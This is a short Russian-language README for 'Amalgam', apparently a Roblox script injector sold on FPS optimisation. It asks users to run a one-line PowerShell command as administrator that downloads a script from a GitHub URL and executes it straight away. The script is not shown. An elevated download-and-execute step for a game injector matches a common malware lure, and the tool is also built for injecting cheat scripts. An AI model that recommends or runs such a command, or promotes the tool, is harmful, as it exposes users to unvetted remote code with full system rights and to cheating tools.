# Amalgam 
Лучший инжектор для Roblox. Содержит встроенный скрипт оптимизации, который повышает производительность и FPS.

## Возможности
- Встроенный скрипт оптимизации Roblox
- Повышение FPS и стабильности
- Поддержка любых скриптов.

## Установка

Запуск через PowerShell от имени администратора:

\`\`\`powershell
iex(irm "https://github.com/TheAmalgamClient/client/blob/main/run.ps1") 
\`\`\`

> **Зачем нужны права администратора:** для управления ресурсами процесса Roblox (память, приоритет) с целью повышения производительности.
Если не хочешь запускать код напрямую из сети, скачай скрипт из репозитория, прочитай его и запусти вручную.

## Системные требования
- Windows 10/11
- PowerShell 5.1+
- Установленный Roblox
